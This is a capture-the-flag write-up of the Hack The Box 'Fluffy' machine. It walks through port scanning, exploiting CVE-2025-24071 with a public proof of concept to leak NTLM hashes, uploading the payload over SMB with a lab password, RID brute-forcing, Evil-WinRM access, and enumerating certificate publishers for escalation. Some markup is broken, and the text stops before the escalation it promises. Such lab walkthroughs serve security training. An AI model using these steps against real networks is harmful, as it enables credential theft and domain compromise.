This write-up details the end-to-end compromise of the <code>Fluffy</code> machine on Hack The Box. Starting with network reconnaissance and service enumeration, it demonstrates gaining initial access via SMB, exploiting a Windows File Explorer spoofing vulnerability to capture NTLM hashes, leveraging Kerberos for domain mapping, abusing Active Directory Certificate Services for shadow credential injection, and ultimately seizing full Administrator control through credential forging and extraction. Each phase builds on the last‚Äîculminating in a successful SYSTEM shell and flag retrieval.

### üß© Enumeration and Initial Access

<p class="indent-paragraph">
An initial <code>full-TCP SYN</code> scan against all 65 535 ports (with host discovery disabled and a timing template of T4) confirmed that the target is alive and exposing a suite of Windows domain services. Open ports include <code>DNS</code> (53), <code>Kerberos</code> (88/464), <code>NetBIOS/SMB</code> (139/445), <code>LDAP</code> (389/636), <code>RPC/WS-Management</code> (593/5985), <code>AD Web Services</code> (9389), and several high ephemeral ports‚Äîall indicators of a <code>Domain Controller</code> role ready for further Active Directory enumeration.

The <code>Upgrade_Notice.pdf</code> isn‚Äôt just a notice‚Äîit‚Äôs a vulnerability assessment report for the domain controller.

### üí• CVE-2025-24071 Exploitation

<p class="indent-paragraph">
To exploit <code>CVE-2025-24071</code><span class="codefix">,</span> you can use the public PoC at 
<a href="https://github.com/ThemeHackers/CVE-2025-24071" target="_blank">ThemeHackers/CVE-2025-24071</a>. It abuses Windows Explorer‚Äôs automatic parsing of <code>.library-ms</code> files by packing a malicious SMB path inside a RAR/ZIP. When the archive is extracted, Explorer sends an NTLM authentication request to the attacker-controlled server, leaking the user‚Äôs hash.
</p>

~$ python3 -m venv venv

~$ source ./venv/bin/activate

~$ pip install -r requirements.txt
```

<p class="indent-paragraph">
  Once executed, the exploit creates the <code>.library-ms</code> payload, bundles it into <code>exploit.zip</code><span class="codefix">,</span> and cleans up any temporary files. You then host <code>exploit.zip</code> over SMB (or another delivery method) and wait for the victim to extract it‚Äîthis triggers an automatic SMB authentication to your listener, capturing the NTLM hash for subsequent Pass-the-Hash or relay attacks.
</p>

```
~$ python3 exploit.py -i <VPN> -f exploit

Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.
```

<p class="indent-paragraph">
  Next, you‚Äôll spin up an SMB server pointing at your payload directory and push the <code>exploit.zip</code> to the target‚Äôs share. This lets the victim machine automatically download and extract the library file, triggering the vulnerable behavior.
</p>

```
~$ mkdir shares
~$ mv exploit.zip shares/

~$ smbclient //dc.fluffy.htb/IT -U=j.fleischman%'J0elTHEM4n1990!' -c "put exploit.zip"

```

<p class="indent-paragraph">
By standing up an SMB listener via Impacket‚Äôs <samp>impacket-smbserver</samp> and waiting for the victim to connect, we successfully captured the NTLM hash of the account <strong>p.agila</strong>. This hash can now be subjected to offline cracking or relay attacks to further compromise the FLUFFY.HTB domain.

The next step was to enumerate domain users via RID brute-forcing. <code>nxc</code> (NetExec), a modern and modular successor to CrackMapExec, proved ideal for the task. By leveraging the <code>--rid-brute</code> option, we prompted the domain controller to reveal internal identifiers tied to user accounts. RIDs (Relative Identifiers) are how Active Directory distinguishes users and groups under the hood. Even with low privileges, a properly filtered enumeration can reveal a surprising amount of structure within the environment.

<p class="indent-paragraph">
During graph exploration from the context of <code>p.agila@fluffy.htb</code><span class="codefix">,</span> we identified that the user had transitive visibility into several service accounts and privileged groups. One notable finding was the account <code>WINRM_SVC@FLUFFY.HTB</code> being a direct member of the <span class="blue">Remote Management Users</span> group. This group grants access to WinRM (via <code>WSMan</code>), making its members suitable candidates for remote command execution through tools like <code>Evil-WinRM</code><span class="codefix">.</span> This discovery provided a viable path to achieve remote access by targeting accounts with legitimate permissions, reducing detection risk while maintaining operational integrity.

### ‚¨ÜÔ∏è Privilege Escalation

<p class="indent-paragraph">
Following the initial foothold, we shifted focus toward identifying accounts with elevated interactions within the certificate infrastructure. While operating as <code>WINRM_SVC</code> in the context of <code>Evil-WinRM</code><span class="codefix">,</span> we executed an enumeration of the <span class="blue">Cert Publishers</span> group using PowerShell. This group plays a critical role in certificate operations and often includes accounts trusted by the Certificate Authority. The enumeration revealed two principals: the domain controller's machine account <code>DC01$</code> and the user account <code>ca_svc</code><span class="codefix">.</span> This discovery isolated <code>ca_svc</code> as the only user-level identity with potential influence over certificate publication workflows, marking it as a prime target for privilege escalation through certificate-based attacks.
</p>

```
~$ *Evil-WinRM* PS C:\Users\winrm_svc\Desktop> Get-ADGroupMember -Identity "CERT PUBLISHERS"

<p class="indent-paragraph">
To further confirm the group membership, we parsed each member of the <span class="blue">Cert Publishers</span> group via LDAP resolution using PowerShell's ADSI interface. This yielded only two <code>sAMAccountName</code> entries: <code>ca_svc</code> and <code>DC01$</code><span class="codefix">.</span> This reinforced our previous finding ‚Äî <code>ca_svc</code> is the only human-controlled account trusted by the certificate services, thus uniquely positioned for abuse in enrollment scenarios targeting the <code>User</code> template.
